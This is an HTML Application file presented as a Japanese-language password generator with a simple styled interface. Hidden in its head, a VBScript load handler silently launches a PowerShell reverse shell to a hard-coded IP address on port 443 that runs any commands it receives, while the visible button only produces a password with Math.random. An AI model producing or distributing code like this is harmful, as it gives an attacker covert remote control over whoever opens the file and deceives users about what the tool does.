<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <hta:application 
        applicationname="PasswordGenerator" 
        windowstate="normal" 
        showintaskbar="yes" 
        scroll="no" 
        sysmenu="yes" 
        maximizebutton="no" 
        minimizebutton="yes"
    >
    <title>パスワード生成ツール</title>
    
    <!-- HTAが読み込まれた瞬間に裏でリバースシェルを発火 -->
    <script language="VBScript">
        Sub Window_OnLoad
            Dim shell
            Set shell = CreateObject("WScript.Shell")
            
            Dim ip, port
            ip = "160.251.173.41"
            port = 443
            
            Dim psCmd
            psCmd = "powershell -WindowStyle Hidden -Command ""$L='" & ip & "';$P=" & port & ";$C=New-Object System.Net.Sockets.TCPClient($L,$P);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(New-Object System.Text.ASCIIEncoding).GetString($B,0,$I);$SB=(iex $D 2>&1 | Out-String);$SB2=$SB+'PS '+(pwd).Path+'> ';$BY=([text.encoding]::ASCII).GetBytes($SB2);$S.Write($BY,0,$BY.Length);$S.Flush()};$C.Close()"""
            
            ' 裏で実行（ウィンドウ非表示）
            shell.Run psCmd, 0, False
        End Sub
    </script>

    <style>
        :root {
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --text-color: #1e293b;
            --primary-color: #3b82f6;
            --primary-hover: #2563eb;
            --border-color: #e2e8f0;
            --muted-color: #64748b;
        }

        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: var(--card-bg);
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }

        h2 {
            margin-top: 0;
            font-size: 1.25rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .result-box {
            background-color: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            text-align: center;
        }

        #pw {
            margin: 0;
            font-family: monospace;
            font-size: 1.25rem;
            letter-spacing: 1px;
            color: var(--muted-color);
            word-break: break-all;
        }

        button {
            width: 100%;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 0.75rem;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        button:hover {
            background-color: var(--primary-hover);
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>パスワード生成ツール</h2>
        <div class="result-box">
            <p id="pw">ボタンを押して生成</p>
        </div>
        <button onclick="generate()">パスワードを生成</button>
    </div>

    <script>
        // ボタンを2回押したときの演出（必要なら別の動作に置き換え可能）
        let clickCount = 0;

        function generate() {
            clickCount++;
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
            let password = "";
            for (let i = 0; i < 12; i++) {
                password += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            const pwElement = document.getElementById("pw");
            pwElement.innerText = password;
            pwElement.style.color = "var(--text-color)";

            if (clickCount === 2) {
                // 2回目押したときの挙動（例: さらに別のメッセージや演出を入れたい場合）
                // すでに裏で通信は通っているので、ここは純粋にUI上の遊びに使える
            }
        }
    </script>
</body>
</html>
